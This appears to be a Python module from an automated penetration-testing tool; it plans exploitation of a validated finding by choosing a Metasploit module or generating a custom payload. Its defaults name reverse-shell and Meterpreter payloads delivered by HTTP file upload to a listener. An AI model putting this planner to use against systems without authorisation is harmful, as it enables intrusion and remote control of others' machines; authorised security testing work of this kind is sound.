"""The §2.3.2 decision: Metasploit-first, custom-on-demand.

For a validated finding, first check whether a maintained module fits (more
reliable than a fresh script). If one does, plan to use it. If none fits — the
bespoke case — plan a custom delivery. This is a deterministic proposal; the
gates and execution are decided upstream in the TS tool path.
"""

from __future__ import annotations

from .bridge import MsfBridge
from .records import ExploitPlan, ExploitTarget, PayloadMode

DEFAULT_PAYLOAD = "generic/shell_reverse_tcp"


def plan_exploit(
    bridge: MsfBridge,
    target: ExploitTarget,
    *,
    lhost: str,
    lport: int = 4444,
    min_fit: float = 0.5,
    custom_payload_type: str = "php/meterpreter/reverse_tcp",
    custom_transport: str = "http-file-upload",
) -> ExploitPlan:
    match = bridge.find_module(target)
    if match is not None and match.fit >= min_fit:
        return ExploitPlan(
            mode=PayloadMode.METASPLOIT_MODULE,
            target=target,
            module=match,
            rationale=(
                f"Metasploit-first: module '{match.fullname}' (rank {match.rank}, fit {match.fit:.2f}) "
                f"fits {target.product or target.service}; a maintained module is preferred over a fresh script."
            ),
        )
    payload = bridge.generate_custom_payload(
        target, lhost=lhost, lport=lport, payload_type=custom_payload_type, transport=custom_transport
    )
    return ExploitPlan(
        mode=PayloadMode.CUSTOM_PAYLOAD,
        target=target,
        payload=payload,
        rationale=(
            "No maintained Metasploit module fits this target's shape "
            f"({target.mechanism or target.product or target.service or 'bespoke'}); "
            "writing a custom delivery (payload + transport + listener)."
        ),
    )
